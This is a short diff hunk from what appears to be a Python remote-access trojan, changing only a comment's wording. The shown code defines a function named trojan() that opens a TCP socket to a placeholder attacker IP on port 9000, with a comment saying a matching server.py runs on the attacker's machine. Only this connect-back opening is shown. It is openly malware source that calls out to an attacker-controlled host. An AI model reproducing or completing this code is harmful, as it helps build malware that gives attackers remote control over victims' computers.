@@ -1,6 +1,6 @@
 import threading,random,socket,os
 def trojan():
-    HOST='xxx.xxx.xxx.xxx'  #enter the attacker ip address (on which server.py file is running)
+    HOST='xxx.xxx.xxx.xxx'  #enter the attacker's ip address (on which server.py file is running)
     PORT=9000
     client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     client.connect((HOST,PORT))
